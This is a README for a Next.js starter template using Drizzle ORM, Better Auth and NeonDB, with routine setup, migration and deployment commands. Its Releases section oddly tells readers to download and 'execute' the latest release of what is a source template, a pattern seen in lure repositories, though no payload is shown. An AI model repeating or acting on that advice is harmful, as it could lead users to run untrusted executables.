# Next.js Drizzle Better Auth 🚀

![Next.js Drizzle Better Auth](https://img.shields.io/badge/Next.js-Drizzle_Better_Auth-brightgreen)

Welcome to the **Next.js Drizzle Better Auth** repository! This project serves as a starter kit for building modern full-stack applications. It integrates Drizzle ORM for type-safe database operations, Better Auth for secure authentication, and NeonDB for serverless PostgreSQL. This template offers a solid foundation that is both robust and scalable, designed to meet the needs of today's developers.

## Table of Contents

- [Features](#features)
- [Getting Started](#getting-started)
- [Installation](#installation)
- [Usage](#usage)
- [Folder Structure](#folder-structure)
- [API Endpoints](#api-endpoints)
- [Database Setup](#database-setup)
- [Authentication](#authentication)
- [Deployment](#deployment)
- [Contributing](#contributing)
- [License](#license)
- [Releases](#releases)

## Features

- **Type-Safe Database Operations**: Drizzle ORM ensures that your database interactions are type-safe, reducing runtime errors.
- **Secure Authentication**: Better Auth provides a simple yet secure way to handle user authentication.
- **Serverless PostgreSQL**: NeonDB allows you to leverage a cloud-native database with minimal setup.
- **TypeScript Support**: Built with TypeScript, this starter kit helps catch errors early in the development process.
- **Scalable Architecture**: Designed to grow with your application, making it suitable for both small projects and large-scale systems.

## Getting Started

To get started with the **Next.js Drizzle Better Auth** template, follow the instructions below. For the latest releases, check out our [Releases section](https://github.com/rayandripo/nextjs_drizzle_better-auth/releases).

## Installation

1. **Clone the Repository**:

   ```bash
   git clone https://github.com/rayandripo/nextjs_drizzle_better-auth.git
   cd nextjs_drizzle_better-auth
   ```

2. **Install Dependencies**:

   Use npm or yarn to install the necessary packages.

   ```bash
   npm install
   ```

   or

   ```bash
   yarn install
   ```

3. **Set Up Environment Variables**:

   Create a `.env.local` file in the root directory and add your database connection string and any other required environment variables.

   ```plaintext
   DATABASE_URL=your_database_url
   AUTH_SECRET=your_auth_secret
   ```

## Usage

To run the development server, use the following command:

```bash
npm run dev
```

or

```bash
yarn dev
```

Your application will be available at `http://localhost:3000`.

## Folder Structure

Here's a brief overview of the folder structure:

```
nextjs_drizzle_better-auth/
├── public/
│   └── images/
├── src/
│   ├── components/
│   ├── pages/
│   ├── styles/
│   └── utils/
├── .env.local
├── package.json
└── README.md
```

- **public/**: Contains static assets like images.
- **src/**: Contains the main application code.
- **components/**: Reusable UI components.
- **pages/**: Next.js pages for routing.
- **styles/**: CSS and styling files.
- **utils/**: Utility functions and helpers.

## API Endpoints

The application provides several API endpoints for handling user authentication and database operations. Below are some of the key endpoints:

- `POST /api/auth/login`: Authenticate a user and return a token.
- `POST /api/auth/register`: Register a new user.
- `GET /api/users`: Fetch all users (protected route).
- `GET /api/posts`: Fetch all posts (protected route).

## Database Setup

To set up your database, follow these steps:

1. **Create a PostgreSQL Database**:

   You can use NeonDB or any PostgreSQL service. Ensure you have the necessary credentials.

2. **Run Migrations**:

   Use Drizzle ORM to set up your database schema. Create migration files as needed.

   ```bash
   npx drizzle-kit migrate
   ```

## Authentication

This starter kit uses Better Auth for user authentication. To integrate it:

1. **Install Better Auth**:

   ```bash
   npm install better-auth
   ```

2. **Set Up Authentication**:

   In your API routes, import and configure Better Auth to handle login and registration.

3. **Protect Routes**:

   Use middleware to protect sensitive routes. Ensure that only authenticated users can access certain endpoints.

## Deployment

For deployment, you can use platforms like Vercel, Heroku, or any cloud provider that supports Node.js applications. Follow these steps:

1. **Build the Application**:

   Run the following command to create an optimized build.

   ```bash
   npm run build
   ```

2. **Deploy**:

   Follow the specific deployment instructions for your chosen platform. Make sure to set environment variables in the deployment settings.

## Contributing

We welcome contributions! If you'd like to help improve this project, please follow these steps:

1. Fork the repository.
2. Create a new branch for your feature or bug fix.
3. Make your changes and commit them.
4. Push your branch and open a pull request.

Please ensure that your code follows the project's coding standards and includes tests where applicable.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Releases

For the latest releases and updates, visit our [Releases section](https://github.com/rayandripo/nextjs_drizzle_better-auth/releases). Make sure to download the latest version and execute it as needed.

Thank you for checking out the **Next.js Drizzle Better Auth** starter kit! We hope it helps you build amazing applications.